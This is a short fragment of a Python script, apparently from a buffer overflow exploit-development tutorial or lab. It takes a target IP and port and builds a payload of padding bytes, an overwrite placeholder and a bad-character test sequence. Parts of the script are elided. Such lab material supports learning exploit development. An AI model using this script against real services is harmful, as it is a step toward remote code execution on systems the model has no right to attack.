...
#NOTE: \X00 IS A DEFAULT BAD CHARACTER IN MANY SITUATIONS
...
if len(sys.argv) < 3:
	print("Usage: python 04-badchars.py $TargetIP $Port")
	sys.exit(1)
...
#Modify \x41 as per offset found
junk = '\x41' * 230 + '\x42' * 4 + badchars
